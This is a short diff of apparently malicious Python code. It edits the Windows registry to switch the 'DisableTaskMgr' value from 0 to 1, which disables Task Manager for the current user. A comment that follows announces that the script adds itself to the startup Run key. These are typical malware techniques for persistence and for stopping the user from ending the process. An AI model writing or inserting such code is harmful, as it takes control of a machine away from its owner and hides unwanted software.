@@ -101,7 +101,7 @@ try:
     key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
 except:
     key = CreateKey(HKEY_CURRENT_USER, keyVal)
-SetValueEx(key, "DisableTaskMgr", 0, REG_DWORD, 0)   
+SetValueEx(key, "DisableTaskMgr", 0, REG_DWORD, 1)   
 
 # Edits registry to add script to startup
 keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
